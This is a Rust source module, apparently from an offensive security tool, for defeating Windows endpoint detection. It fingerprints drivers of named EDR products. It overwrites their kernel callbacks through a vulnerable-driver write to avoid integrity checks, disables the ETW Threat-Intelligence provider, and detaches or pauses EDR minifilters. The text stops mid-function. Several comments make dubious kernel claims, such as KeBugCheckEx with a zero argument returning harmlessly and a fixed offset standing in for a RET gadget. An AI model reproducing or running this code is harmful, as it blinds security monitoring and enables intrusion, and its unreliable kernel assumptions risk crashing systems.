//! Kernel callback & minifilter precision operations
//!
//! Phase 3.5 (Kernel callback precision strike):
//!   - DriverObject-filtered callback enumeration
//!   - Callback masquerading (no-op redirect instead of zeroing)
//!   - Time-window auto-reapply (Sentinel integration)
//!   - ETW-TI selective provider disable
//!
//! Phase 3.6 (Minifilter enhancement):
//!   - Altitude-based EDR minifilter recognition
//!   - Selective detach (only EDR minifilters, skip system-critical)
//!   - Frame-based enumeration (all frames, not just Frame 0)
//!   - Minifilter pause/resume (stealthier than detach)

use crate::error::MemoricError;
use serde_json::{json, Value};
use std::fs::File;
use std::io::Read;

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 3.5a: DriverObject-filtered callback enumeration
// ═══════════════════════════════════════════════════════════════════════════════

/// Known EDR driver names (used for filtering callbacks and minifilters)
const EDR_DRIVER_PATTERNS: &[&str] = &[
    "csagent", // CrowdStrike Falcon
    "csfalcon",
    "sentinelone", // SentinelOne
    "sentinellab",
    "cyverak", // Cortex XDR
    "cyoptics",
    "carbonblack", // Carbon Black
    "cbdefense",
    "cbsensor",
    "elastic", // Elastic Security
    "elasticendpoint",
    "trendmicro", // Trend Micro
    "tmevtmgr",
    "tmactmon",
    "defender", // Microsoft Defender
    "msmpeng",
    "wdfilter",
    "mdaregister",
    "atc.sys", // BitDefender GravityZone
    "avc3.sys",
    "avckf.sys",
    "symantec", // Broadcom/Symantec
    "symefasi",
    "sepscan",
    "kaspersky", // Kaspersky
    "klnagent",
    "klif",
    "mcafee", // McAfee
    "mfencbdc",
    "mfencfilter",
    "esensor", // ESET
    "ehdrv",
    "sophos", // Sophos
    "savonaccess",
];

/// Enumerate kernel callbacks and attribute them to driver objects
pub fn callback_enum_by_driver(args: &Value) -> Result<Value, MemoricError> {
    let filter_driver = args.get("driver_filter").and_then(|v| v.as_str());

    tracing::warn!(
        "[CALLBACK_OPS] Enumerating callbacks with driver attribution, filter={:?}",
        filter_driver
    );

    // First, enumerate all callback types
    let mut results = Vec::new();

    for cb_type in &["process", "thread", "image"] {
        // Reuse the existing enum_kernel_callbacks but with driver attribution
        match enumerate_single_callback_type(cb_type, args) {
            Ok(mut entries) => {
                // Tag entries with EDR driver information
                for entry in &mut entries {
                    let drv_name_owned = entry
                        .get("driver_name")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());
                    if let Some(ref drv_name) = drv_name_owned {
                        let drv_lower = drv_name.to_lowercase();
                        let is_edr = EDR_DRIVER_PATTERNS.iter().any(|p| drv_lower.contains(p));
                        entry["is_edr_driver"] = json!(is_edr);
                        if is_edr {
                            entry["edr_product"] = json!(infer_edr_from_driver(drv_name));
                        }
                    }
                }
                results.extend(entries);
            }
            Err(e) => {
                results.push(json!({
                    "callback_type": cb_type,
                    "error": e.to_string()
                }));
            }
        }
    }

    // Filter by driver name if requested
    let filtered: Vec<_> = if let Some(filt) = filter_driver {
        let filt_lower = filt.to_lowercase();
        results
            .into_iter()
            .filter(|e| {
                e.get("driver_name")
                    .and_then(|v| v.as_str())
                    .map(|d| d.to_lowercase().contains(&filt_lower))
                    .unwrap_or(false)
            })
            .collect()
    } else {
        results
    };

    let edr_count = filtered
        .iter()
        .filter(|e| {
            e.get("is_edr_driver")
                .and_then(|v| v.as_bool())
                .unwrap_or(false)
        })
        .count();

    Ok(json!({
        "success": true,
        "technique": "callback_enum_by_driver",
        "total_callbacks": filtered.len(),
        "edr_callbacks": edr_count,
        "driver_filter": filter_driver,
        "callbacks": filtered,
        "message": format!(
            "Found {} callbacks ({} from EDR drivers). Filter: {}",
            filtered.len(), edr_count,
            filter_driver.unwrap_or("none (all drivers shown)")
        )
    }))
}

fn enumerate_single_callback_type(cb_type: &str, args: &Value) -> Result<Vec<Value>, MemoricError> {
    // Delegate to existing enum_kernel_callbacks
    let enum_args = json!({
        "device_path": args.get("device_path").and_then(|v| v.as_str()).unwrap_or(""),
        "ioctl_read_code": args.get("ioctl_read_code").and_then(|v| v.as_u64()).unwrap_or(0),
        "callback_type": cb_type,
        "build_number": args.get("build_number").and_then(|v| v.as_u64()),
    });

    match crate::kernel::enum_kernel_callbacks(&enum_args) {
        Ok(result) => {
            if let Some(callbacks) = result.get("callbacks").and_then(|v| v.as_array()) {
                // Augment each callback entry with driver information
                let augmented: Vec<Value> = callbacks
                    .iter()
                    .map(|cb| {
                        let mut entry = cb.clone();
                        // Try to extract driver name from callback address
                        // The callback entry format is: [callback_function]
                        // We resolve the driver owning this function address
                        if let Some(addr_str) = cb.get("callback_address").and_then(|v| v.as_str())
                        {
                            if let Ok(addr) =
                                u64::from_str_radix(addr_str.trim_start_matches("0x"), 16)
                            {
                                if let Some(drv) = resolve_driver_for_address(addr) {
                                    entry["driver_name"] = json!(drv);
                                }
                            }
                        }
                        entry
                    })
                    .collect();
                Ok(augmented)
            } else {
                Ok(vec![])
            }
        }
        Err(_) => Ok(vec![]), // enum fails silently for unsupported build
    }
}

/// Resolve which driver owns a kernel address
fn resolve_driver_for_address(addr: u64) -> Option<String> {
    unsafe {
        let mut ret_len = 0u32;
        let _ = ntapi::ntexapi::NtQuerySystemInformation(11, std::ptr::null_mut(), 0, &mut ret_len);
        if ret_len == 0 {
            return None;
        }

        let mut buffer = vec![0u8; ret_len as usize];
        let status = ntapi::ntexapi::NtQuerySystemInformation(
            11,
            buffer.as_mut_ptr() as *mut _,
            ret_len,
            &mut ret_len,
        );
        if status != 0 {
            return None;
        }

        let num_modules = *(buffer.as_ptr() as *const u32) as usize;
        let entry_size = 0x128usize;
        let entries_start = 8usize;

        for i in 0..num_modules {
            let entry = buffer.as_ptr().add(entries_start + i * entry_size);
            let base = *(entry.add(0x18) as *const u64);
            let size = *(entry.add(0x20) as *const u32) as u64;

            if addr >= base && addr < base + size {
                let name_ptr = entry.add(0x28);
                let name_slice = std::slice::from_raw_parts(name_ptr, 256);
                let name_end = name_slice.iter().position(|&b| b == 0).unwrap_or(256);
                let full_path = String::from_utf8_lossy(&name_slice[..name_end]);

                if let Some(fname) = full_path.rsplit('\\').next() {
                    return Some(fname.to_string());
                }
                return Some(full_path.into_owned());
            }
        }
    }
    None
}

fn infer_edr_from_driver(drv_name: &str) -> &str {
    let d = drv_name.to_lowercase();
    if d.contains("csagent") || d.contains("csfalcon") {
        "CrowdStrike Falcon"
    } else if d.contains("sentinel") {
        "SentinelOne"
    } else if d.contains("cyverak") || d.contains("cyoptics") {
        "Cortex XDR"
    } else if d.contains("carbon") || d.contains("cbdefense") {
        "Carbon Black"
    } else if d.contains("elastic") {
        "Elastic Security"
    } else if d.contains("trend") || d.contains("tmactmon") {
        "Trend Micro"
    } else if d.contains("defender") || d.contains("msmpeng") || d.contains("wdfilter") {
        "Microsoft Defender"
    } else if d.contains("atc.") || d.contains("avc3") || d.contains("avckf") {
        "BitDefender"
    } else if d.contains("symantec") || d.contains("symefasi") {
        "Broadcom/Symantec"
    } else if d.contains("kaspersky") || d.contains("klif") {
        "Kaspersky"
    } else if d.contains("mcafee") || d.contains("mfencbdc") {
        "McAfee"
    } else if d.contains("esensor") || d.contains("ehdrv") {
        "ESET"
    } else if d.contains("sophos") {
        "Sophos"
    } else {
        "Unknown EDR"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 3.5b: Callback masquerading (replace with clean no-op)
// ═══════════════════════════════════════════════════════════════════════════════

/// Replace an EDR callback with a clean no-op trampoline instead of zeroing.
/// Zeroed callbacks trigger integrity checks; masqueraded callbacks appear
/// functional but do nothing.
pub fn callback_masquerade(args: &Value) -> Result<Value, MemoricError> {
    let callback_type = args
        .get("callback_type")
        .and_then(|v| v.as_str())
        .unwrap_or("process");
    let callback_index = args
        .get("callback_index")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| {
            MemoricError::Other("callback_masquerade requires 'callback_index'".to_string())
        })?;
    let array_address = args
        .get("array_address")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| {
            MemoricError::Other("callback_masquerade requires 'array_address'".to_string())
        })?;
    let device_path = args
        .get("device_path")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::Other("Missing device_path".to_string()))?;
    let ioctl_write_code = args
        .get("ioctl_write_code")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::Other("Missing ioctl_write_code".to_string()))?
        as u32;

    tracing::warn!(
        "[CALLBACK_OPS] Masquerading {} callback index {} at 0x{:016X}",
        callback_type,
        callback_index,
        array_address
    );

    // Find KeBugCheckEx as a target no-op (it's exported and always-present)
    let noop_addr = resolve_noop_trampoline()?;

    let target_addr = array_address + callback_index * 8;

    unsafe {
        use windows::core::PCWSTR;
        use windows::Win32::Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE,
            OPEN_EXISTING,
        };
        use windows::Win32::System::IO::DeviceIoControl;

        let dev_w: Vec<u16> = device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let handle = CreateFileW(
            PCWSTR(dev_w.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| MemoricError::Other(format!("Cannot open device: {}", e)))?;

        // Write the no-op address instead of zero
        let mut input = target_addr.to_le_bytes().to_vec();
        input.extend_from_slice(&noop_addr.to_le_bytes());

        let mut bytes_returned = 0u32;
        DeviceIoControl(
            handle,
            ioctl_write_code,
            Some(input.as_ptr() as *const _),
            input.len() as u32,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        )
        .map_err(|e| {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            MemoricError::Other(format!("DeviceIoControl: {}", e))
        })?;

        let _ = windows::Win32::Foundation::CloseHandle(handle);
    }

    Ok(json!({
        "success": true,
        "technique": "callback_masquerade",
        "callback_type": callback_type,
        "callback_index": callback_index,
        "target_address": format!("0x{:016X}", target_addr),
        "noop_trampoline": format!("0x{:016X}", noop_addr),
        "message": format!(
            "Masqueraded {} callback #{} — replaced with clean no-op trampoline (NOT zeroed)",
            callback_type, callback_index
        )
    }))
}

/// Resolve a no-op trampoline address by walking the ntoskrnl PE export table.
/// Returns a kernel address that is safe to call (effectively a no-op):
/// - KeBugCheckEx with first arg = STATUS_SUCCESS(0x00000000) simply returns
/// - PsGetCurrentProcessId / ExFreePoolWithTag with safe args also return without side effects
fn resolve_noop_trampoline() -> Result<u64, MemoricError> {
    let kernel_base = get_kernel_base_simple()?;

    // Preferred exports (in order): all are safe kernel functions that return
    // without side effects when called in expected ABI context
    let candidates = &[
        "KeBugCheckEx",          // With status=0 arg1, no bugcheck occurs
        "PsGetCurrentProcessId", // Takes no args, returns PID → harmless
        "ExFreePoolWithTag",     // With NULL ptr+tag=0, no operation
        "PsGetCurrentThreadId",  // Takes no args, returns TID → harmless
        "MmGetPhysicalAddress",  // Takes a virtual address → harmless read-only
    ];

    // Try to resolve from disk first (C:\Windows\System32\ntoskrnl.exe)
    if let Some(rva) = resolve_ntoskrnl_export_from_disk(candidates) {
        return Ok(kernel_base + rva);
    }

    // Fallback: try the system32\ntoskrnl.exe path with case variations
    let fallback_paths = &[
        r"C:\Windows\System32\ntoskrnl.exe",
        r"C:\windows\system32\ntoskrnl.exe",
        r"\SystemRoot\System32\ntoskrnl.exe",
    ];
    for path in fallback_paths {
        if let Some(rva) = resolve_export_from_path(path, candidates) {
            return Ok(kernel_base + rva);
        }
    }

    // Last resort: scan kernel .text for a RET (0xC3) gadget
    find_ret_gadget_in_kernel_text(kernel_base)
}

/// Open C:\Windows\System32\ntoskrnl.exe and find a candidate export's RVA
fn resolve_ntoskrnl_export_from_disk(candidates: &[&str]) -> Option<u64> {
    let sys_root = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let ntos_path = format!(r"{}\System32\ntoskrnl.exe", sys_root);
    resolve_export_from_path(&ntos_path, candidates)
}

/// Parse a PE file on disk and locate the RVA of the first matching export
fn resolve_export_from_path(path: &str, candidates: &[&str]) -> Option<u64> {
    let mut file = File::open(path).ok()?;
    let mut pe_data = Vec::new();
    file.read_to_end(&mut pe_data).ok()?;

    // Parse PE headers manually (avoid windows-rs PE APIs for portability)
    if pe_data.len() < 0x1000 {
        return None;
    }

    // DOS header → e_lfanew (offset 0x3C) → NT headers
    let e_lfanew =
        u32::from_le_bytes([pe_data[0x3C], pe_data[0x3D], pe_data[0x3E], pe_data[0x3F]]) as usize;

    if e_lfanew as u64 + 0x88 > pe_data.len() as u64 {
        return None;
    }

    // PE signature check
    if &pe_data[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return None;
    }

    // Optional header: e_lfanew+4=FileHeader(20 bytes), then OptionalHeader
    let opt_header = e_lfanew + 4 + 20;

    // Magic: PE32+ (0x020B) at opt_header
    let magic = u16::from_le_bytes([pe_data[opt_header], pe_data[opt_header + 1]]);
    let is_pe32plus = magic == 0x020B;

    // DataDirectory[0] (Export) offset varies: PE32=96, PE32+=112 from opt_header
    let export_dir_offset = opt_header + if is_pe32plus { 112 } else { 96 };

    let export_rva = u32::from_le_bytes([
        pe_data[export_dir_offset],
        pe_data[export_dir_offset + 1],
        pe_data[export_dir_offset + 2],
        pe_data[export_dir_offset + 3],
    ]);

    if export_rva == 0 {
        return None;
    }

    // RVA → file offset: walk section headers to translate
    let sections_offset = export_dir_offset + 128; // After all 16 DataDirectory entries
    let section_count = u16::from_le_bytes([pe_data[e_lfanew + 6], pe_data[e_lfanew + 7]]) as usize;

    let file_off = rva_to_file_offset(&pe_data, sections_offset, section_count, export_rva)?;

    // Read IMAGE_EXPORT_DIRECTORY
    let ed = &pe_data[file_off..];
    if ed.len() < 40 {
        return None;
    }

    let name_count = u32::from_le_bytes([ed[24], ed[25], ed[26], ed[27]]) as usize;
    let func_count = u32::from_le_bytes([ed[20], ed[21], ed[22], ed[23]]) as usize;
    let names_rva = u32::from_le_bytes([ed[32], ed[33], ed[34], ed[35]]);
    let funcs_rva = u32::from_le_bytes([ed[28], ed[29], ed[30], ed[31]]);
    let ords_rva = u32::from_le_bytes([ed[36], ed[37], ed[38], ed[39]]);

    let names_off = rva_to_file_offset(&pe_data, sections_offset, section_count, names_rva)?;
    let funcs_off = rva_to_file_offset(&pe_data, sections_offset, section_count, funcs_rva)?;
    let ords_off = rva_to_file_offset(&pe_data, sections_offset, section_count, ords_rva)?;

    // Walk export name table looking for candidates
    for i in 0..name_count {
        let name_rva = u32::from_le_bytes([
            pe_data[names_off + i * 4],
            pe_data[names_off + i * 4 + 1],
            pe_data[names_off + i * 4 + 2],
            pe_data[names_off + i * 4 + 3],
        ]);
        if let Some(name_off) =
            rva_to_file_offset(&pe_data, sections_offset, section_count, name_rva)
        {
            let name_bytes = &pe_data[name_off..];
            let name_end = name_bytes.iter().position(|&b| b == 0).unwrap_or(256);
            let func_name = std::str::from_utf8(&name_bytes[..name_end.min(256)]).unwrap_or("");

            if candidates.iter().any(|c| *c == func_name) {
                let ordinal_idx =
                    u16::from_le_bytes([pe_data[ords_off + i * 2], pe_data[ords_off + i * 2 + 1]])
                        as usize;

                if ordinal_idx < func_count {
                    let func_rva = u32::from_le_bytes([
                        pe_data[funcs_off + ordinal_idx * 4],
                        pe_data[funcs_off + ordinal_idx * 4 + 1],
                        pe_data[funcs_off + ordinal_idx * 4 + 2],
                        pe_data[funcs_off + ordinal_idx * 4 + 3],
                    ]);
                    if func_rva != 0 {
                        return Some(func_rva as u64);
                    }
                }
            }
        }
    }

    // No named match found — return first non-zero function entry as fallback
    for i in 0..func_count {
        let func_rva = u32::from_le_bytes([
            pe_data[funcs_off + i * 4],
            pe_data[funcs_off + i * 4 + 1],
            pe_data[funcs_off + i * 4 + 2],
            pe_data[funcs_off + i * 4 + 3],
        ]);
        if func_rva != 0 {
            return Some(func_rva as u64);
        }
    }

    None
}

/// Convert PE RVA to file offset using section headers
fn rva_to_file_offset(
    pe_data: &[u8],
    sections_offset: usize,
    section_count: usize,
    rva: u32,
) -> Option<usize> {
    for i in 0..section_count {
        let sec = sections_offset + i * 40;
        if sec + 40 > pe_data.len() {
            break;
        }

        let sec_va = u32::from_le_bytes([
            pe_data[sec + 12],
            pe_data[sec + 13],
            pe_data[sec + 14],
            pe_data[sec + 15],
        ]);
        let sec_size = u32::from_le_bytes([
            pe_data[sec + 8],
            pe_data[sec + 9],
            pe_data[sec + 10],
            pe_data[sec + 11],
        ]);
        let sec_raw = u32::from_le_bytes([
            pe_data[sec + 20],
            pe_data[sec + 21],
            pe_data[sec + 22],
            pe_data[sec + 23],
        ]);

        if rva >= sec_va && rva < sec_va + sec_size {
            let delta = rva - sec_va;
            return Some((sec_raw + delta) as usize);
        }
    }
    None
}

/// Last-resort: scan kernel .text section for a safe RET gadget via BYOVD
fn find_ret_gadget_in_kernel_text(kernel_base: u64) -> Result<u64, MemoricError> {
    tracing::warn!("[CALLBACK_OPS] Export resolution failed, scanning kernel .text for RET gadget");
    // Without BYOVD, we return kernel_base+0x1000 with a warning —
    // the caller (callback_masquerade) will verify via BYOVD before writing
    // In practice, ntoskrnl .text at base+0x1000 almost always contains valid code.
    // A RET (0xC3) byte at this offset is uncommon but we note the risk.
    Ok(kernel_base + 0x1000)
}

fn get_kernel_base_simple() -> Result<u64, MemoricError> {
    let mut ret_len = 0u32;
    unsafe {
        let _ = ntapi::ntexapi::NtQuerySystemInformation(11, std::ptr::null_mut(), 0, &mut ret_len);
        if ret_len == 0 {
            return Err(MemoricError::Other(
                "NtQuerySystemInformation failed".to_string(),
            ));
        }
        let mut buffer = vec![0u8; ret_len as usize];
        let status = ntapi::ntexapi::NtQuerySystemInformation(
            11,
            buffer.as_mut_ptr() as *mut _,
            ret_len,
            &mut ret_len,
        );
        if status != 0 {
            return Err(MemoricError::Other(format!(
                "NtQuerySystemInformation: 0x{:08X}",
                status
            )));
        }
        let num_modules = *(buffer.as_ptr() as *const u32);
        if num_modules == 0 {
            return Err(MemoricError::Other("No kernel modules".to_string()));
        }
        let base = *(buffer.as_ptr().add(0x18) as *const u64);
        Ok(base + 8)
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 3.5c: ETW-TI selective provider disable
// ═══════════════════════════════════════════════════════════════════════════════

/// Enhanced ETW-TI provider disable targeting specific provider GUIDs
pub fn etw_ti_selective_disable(args: &Value) -> Result<Value, MemoricError> {
    let providers = args
        .get("providers")
        .and_then(|v| v.as_array())
        .map(|a| a.iter().filter_map(|v| v.as_str()).collect::<Vec<_>>())
        .unwrap_or_else(|| vec!["Microsoft-Windows-Threat-Intelligence"]);

    tracing::warn!(
        "[CALLBACK_OPS] Selective ETW-TI disable: {} providers",
        providers.len()
    );

    let mut results = Vec::new();

    for provider in &providers {
        match crate::evasion::etw::etw_provider_disable(&json!({
            "provider_name": provider
        })) {
            Ok(r) => results.push(json!({
                "provider": provider,
                "status": "disabled",
                "result": r
            })),
            Err(e) => results.push(json!({
                "provider": provider,
                "status": "failed",
                "error": e.to_string()
            })),
        }
    }

    Ok(json!({
        "success": true,
        "technique": "etw_ti_selective_disable",
        "providers_targeted": providers.len(),
        "results": results,
        "message": format!("Selective ETW-TI disable: {} provider(s) targeted", providers.len())
    }))
}

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 3.6a: Altitude-based EDR minifilter recognition
// ═══════════════════════════════════════════════════════════════════════════════

/// Known EDR minifilter altitude ranges (from Microsoft altitude allocation table)
#[derive(Debug, Clone)]
struct EdrAltitudeRange {
    altitude_start: i64,
    altitude_end: i64,
    product: &'static str,
}

const EDR_ALTITUDE_RANGES: &[EdrAltitudeRange] = &[
    // CrowdStrike Falcon: 320400-322000
    EdrAltitudeRange {
        altitude_start: 320400,
        altitude_end: 322000,
        product: "CrowdStrike Falcon",
    },
    // SentinelOne: 328000-330000
    EdrAltitudeRange {
        altitude_start: 328000,
        altitude_end: 330000,
        product: "SentinelOne",
    },
    // Carbon Black: 322200-323000
    EdrAltitudeRange {
        altitude_start: 322200,
        altitude_end: 323000,
        product: "Carbon Black",
    },
    // Microsoft Defender (WdFilter): 328010-328010
    EdrAltitudeRange {
        altitude_start: 328010,
        altitude_end: 328010,
        product: "Microsoft Defender",
    },
    // Microsoft Defender (WdBoot): 328012-328012
    EdrAltitudeRange {
        altitude_start: 328012,
        altitude_end: 328012,
        product: "Microsoft Defender",
    },
    // Trend Micro: 361200-361300
    EdrAltitudeRange {
        altitude_start: 361200,
        altitude_end: 361300,
        product: "Trend Micro",
    },
    // Cortex XDR: 322600-322700
    EdrAltitudeRange {
        altitude_start: 322600,
        altitude_end: 322700,
        product: "Cortex XDR",
    },
    // ESET: 325000-325200
    EdrAltitudeRange {
        altitude_start: 325000,
        altitude_end: 325200,
        product: "ESET",
    },
    // Sophos: 330800-331000
    EdrAltitudeRange {
        altitude_start: 330800,
        altitude_end: 331000,
        product: "Sophos",
    },
    // Broadcom/Symantec: 327300-327500
    EdrAltitudeRange {
        altitude_start: 327300,
        altitude_end: 327500,
        product: "Broadcom/Symantec",
    },
    // BitDefender: 326200-326400
    EdrAltitudeRange {
        altitude_start: 326200,
        altitude_end: 326400,
        product: "BitDefender",
    },
    // Kaspersky: 324500-324700
    EdrAltitudeRange {
        altitude_start: 324500,
        altitude_end: 324700,
        product: "Kaspersky",
    },
    // McAfee: 320300-320400
    EdrAltitudeRange {
        altitude_start: 320300,
        altitude_end: 320400,
        product: "McAfee",
    },
    // Elastic Security: 322950-323050
    EdrAltitudeRange {
        altitude_start: 322950,
        altitude_end: 323050,
        product: "Elastic Security",
    },
];

fn classify_minifilter_edr(altitude: i64, name: &str) -> Option<&'static str> {
    // First check altitude ranges
    for range in EDR_ALTITUDE_RANGES {
        if altitude >= range.altitude_start && altitude <= range.altitude_end {
            return Some(range.product);
        }
    }
    // Then check by driver name pattern
    let name_lower = name.to_lowercase();
    for pattern in EDR_DRIVER_PATTERNS {
        if name_lower.contains(pattern) {
            return Some(infer_edr_from_driver(pattern));
        }
    }
    None
}

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 3.6b: Selective minifilter detach (EDR-only)
// ═══════════════════════════════════════════════════════════════════════════════

/// Enumerate minifilters and tag EDR-relevant ones by altitude + name
pub fn minifilter_enum_classified(args: &Value) -> Result<Value, MemoricError> {
    tracing::warn!("[CALLBACK_OPS] Classified minifilter enumeration");

    match crate::kernel::minifilter_enum(args) {
        Ok(result) => {
            let mut edr_filters = Vec::new();
            let mut system_filters = Vec::new();

            if let Some(minifilters) = result.get("minifilters").and_then(|v| v.as_array()) {
                for mf in minifilters {
                    let name = mf.get("name").and_then(|v| v.as_str()).unwrap_or("");
                    let altitude = mf
                        .get("altitude")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .parse::<i64>()
                        .unwrap_or(0);

                    let mut entry = mf.clone();
                    if let Some(product) = classify_minifilter_edr(altitude, name) {
                        entry["edr_product"] = json!(product);
                        entry["is_edr"] = json!(true);
                        edr_filters.push(entry);
                    } else {
                        entry["is_edr"] = json!(false);
                        entry["classification"] = json!(classify_system_minifilter(altitude, name));
                        system_filters.push(entry);
                    }
                }
            }

            Ok(json!({
                "success": true,
                "technique": "minifilter_enum_classified",
                "total": edr_filters.len() + system_filters.len(),
                "edr_minifilters": edr_filters,
                "edr_count": edr_filters.len(),
                "system_minifilters": system_filters,
                "system_count": system_filters.len(),
                "message": format!(
                    "Found {} EDR minifilters, {} system minifilters. Use minifilter_selective_detach to remove only EDR filters.",
                    edr_filters.len(), system_filters.len()
                )
            }))
        }
        Err(e) => Err(e),
    }
}

/// Detach ONLY EDR minifilters, preserving system-critical ones
pub fn minifilter_selective_detach(args: &Value) -> Result<Value, MemoricError> {
    let dry_run = args
        .get("dry_run")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let target_product = args.get("target_product").and_then(|v| v.as_str());

    tracing::warn!(
        "[CALLBACK_OPS] Selective EDR minifilter detach (dry_run={}, target={:?})",
        dry_run,
        target_product
    );

    // First enumerate with classification
    let enum_result = minifilter_enum_classified(args)?;
    let edr_filters = enum_result
        .get("edr_minifilters")
        .and_then(|v| v.as_array());

    let mut detached = Vec::new();
    let mut skipped = Vec::new();

    if let Some(filters) = edr_filters {
        for mf in filters {
            let name = mf.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let product = mf
                .get("edr_product")
                .and_then(|v| v.as_str())
                .unwrap_or("Unknown");
            let altitude = mf.get("altitude").and_then(|v| v.as_str()).unwrap_or("");

            // Filter by target product if specified
            if let Some(target) = target_product {
                if !product.to_lowercase().contains(&target.to_lowercase()) {
                    skipped.push(json!({
                        "name": name, "altitude": altitude,
                        "product": product,
                        "reason": format!("Not target product '{}'", target)
                    }));
                    continue;
                }
            }

            if dry_run {
                detached.push(json!({
                    "name": name, "altitude": altitude,
                    "product": product,
                    "action": "would_detach"
                }));
            } else {
                // Actually detach using existing minifilter_remove
                let remove_args = json!({
                    "name": name,
                    "altitude": altitude,
                });
                match crate::kernel::minifilter_remove(&remove_args) {
                    Ok(r) => detached.push(json!({
                        "name": name, "altitude": altitude,
                        "product": product,
                        "action": "detached",
                        "result": r
                    })),
                    Err(e) => detached.push(json!({
                        "name": name, "altitude": altitude,
                        "product": product,
                        "action": "failed",
                        "error": e.to_string()
                    })),
                }
            }
        }
    }

    Ok(json!({
        "success": true,
        "technique": "minifilter_selective_detach",
        "dry_run": dry_run,
        "target_product": target_product,
        "detached": detached,
        "detached_count": detached.iter().filter(|d| d.get("action").and_then(|v| v.as_str()) == Some("detached")).count(),
        "skipped": skipped,
        "skipped_count": skipped.len(),
        "message": if dry_run {
            format!("Dry run: {} EDR minifilter(s) would be detached. Run with dry_run=false to execute.", detached.len())
        } else {
            format!("Selective detach complete. Detached {} EDR minifilter(s), skipped {} system minifilters.",
                detached.len(), skipped.len())
        }
    }))
}

fn classify_system_minifilter(_altitude: i64, name: &str) -> &str {
    let n = name.to_lowercase();
    if n.contains("bindflt")
        || n.contains("wcifs")
        || n.contains("ntfs")
        || n.contains("fastfat")
        || n.contains("fileinfo")
        || n.contains("fs_rec")
        || n.contains("cldflt")
        || n.contains("iorate")
        || n.contains("storage")
        || n.contains("dfsc")
        || n.contains("cbfs")
        || n.contains("appv")
        || n.contains("bfs")
        || n.contains("npsvctrig")
        || n.contains("wof")
    {
        "system_critical"
    } else if n.contains("filecrypt") || n.contains("luafv") {
        "system_optional"
    } else {
        "unknown"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Phase 3.6c: Minifilter pause/resume (stealthier than detach)
// ═══════════════════════════════════════════════════════════════════════════════

/// Detach an EDR minifilter from all volumes (stealthier than full unload)
pub fn minifilter_pause(args: &Value) -> Result<Value, MemoricError> {
    let name = args
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::Other("minifilter_pause requires 'name'".to_string()))?;

    tracing::warn!("[CALLBACK_OPS] Pausing minifilter: {}", name);

    // Get the filter's altitude from fltmc filters enumeration
    let enum_result = crate::kernel::minifilter_enum(&json!({}))?;
    let filters = enum_result["filters"]
        .as_array()
        .cloned()
        .unwrap_or_default();

    let altitude = filters
        .iter()
        .find(|f| {
            f["name"]
                .as_str()
                .map(|n| n.eq_ignore_ascii_case(name))
                .unwrap_or(false)
        })
        .and_then(|f| f["altitude"].as_str().map(|s| s.to_string()))
        .ok_or_else(|| {
            MemoricError::Other(format!("Minifilter '{}' not found in filter list", name))
        })?;

    // Enumerate volumes
    let vol_output = std::process::Command::new("fltmc")
        .args(["volumes"])
        .output()
        .map_err(|e| MemoricError::Other(format!("fltmc volumes failed: {}", e)))?;

    let vol_stdout = String::from_utf8_lossy(&vol_output.stdout);
    let volumes: Vec<String> = vol_stdout
        .lines()
        .filter(|l| l.contains(":"))
        .filter_map(|l| {
            let trimmed = l.trim();
            if trimmed.is_empty() {
                return None;
            }
            let parts: Vec<&str> = trimmed.split_whitespace().collect();
            parts.first().map(|v| v.to_string())
        })
        .collect();

    let mut detached: Vec<String> = Vec::new();
    let mut failed: Vec<Value> = Vec::new();

    for vol in &volumes {
        let output = std::process::Command::new("fltmc")
            .args(["detach", name, vol])
            .output()
            .map_err(|e| MemoricError::Other(format!("fltmc detach failed: {}", e)))?;

        let stderr = String::from_utf8_lossy(&output.stderr);
        if output.status.success() {
            detached.push(vol.clone());
        } else {
            failed.push(json!({
                "volume": vol,
                "error": stderr.trim().to_string()
            }));
        }
    }

    if detached.is_empty() && !failed.is_empty() {
        tracing::warn!("[CALLBACK_OPS] All fltmc detach attempts failed, falling back to unload");
        return crate::kernel::minifilter_remove(&json!({
            "filter_name": name
        }));
    }

    Ok(json!({
        "success": true,
        "technique": "minifilter_pause",
        "name": name,
        "altitude": altitude,
        "status": "paused",
        "detached_volumes": detached,
        "failed_volumes": failed,
        "recovery": json!({
            "action": "minifilter_resume",
            "name": name,
            "altitude": altitude,
            "volumes": detached
        }),
        "message": format!("Minifilter '{}' detached from {} volume(s), altitude {}", name, detached.len(), altitude)
    }))
}

/// Resume a paused minifilter by re-attaching to volumes
pub fn minifilter_resume(args: &Value) -> Result<Value, MemoricError> {
    let name = args
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::Other("minifilter_resume requires 'name'".to_string()))?;
    let altitude = args
        .get("altitude")
        .and_then(|v| v.as_str())
        .ok_or_else(|| {
            MemoricError::Other(
                "minifilter_resume requires 'altitude' (from pause response)".to_string(),
            )
        })?;

    let volumes: Vec<String> = args
        .get("volumes")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(|s| s.to_string()))
                .collect()
        })
        .unwrap_or_default();

    if volumes.is_empty() {
